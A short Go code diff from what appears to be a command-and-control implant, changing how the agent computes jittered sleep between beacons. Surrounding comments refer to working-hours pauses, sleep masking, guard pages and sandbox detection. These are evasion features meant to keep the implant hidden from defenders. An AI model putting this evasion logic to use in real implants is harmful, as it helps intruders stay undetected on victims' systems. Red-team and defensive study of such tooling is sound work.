@@ -150,7 +150,7 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, so
 				waitMinutes := agent.MinutesUntilWorkingHours(time.Now())
 				if waitMinutes > 0 {
 					// Add jitter to the wake time (±jitter% of sleep interval, not the full wait)
-					jitterOffset := calculateSleepTime(agent.SleepInterval, agent.Jitter) - time.Duration(agent.SleepInterval)*time.Second
+					jitterOffset := commands.CalculateAdaptiveSleep(agent.SleepInterval, agent.Jitter, agent.JitterProfile) - time.Duration(agent.SleepInterval)*time.Second
 					sleepDuration := time.Duration(waitMinutes)*time.Minute + jitterOffset
 					log.Printf("schedule pause %v", sleepDuration)
 					var whVault *sleepVault
@@ -218,7 +218,7 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, so
 			}
 
 			// Sleep before next iteration — with optional sleep mask, guard pages, and sandbox detection
-			sleepTime := calculateSleepTime(agent.SleepInterval, agent.Jitter)
+			sleepTime := commands.CalculateAdaptiveSleep(agent.SleepInterval, agent.Jitter, agent.JitterProfile)
 			var vault *sleepVault
 			var guard *guardedPages
 			if sleepMaskEnabled {
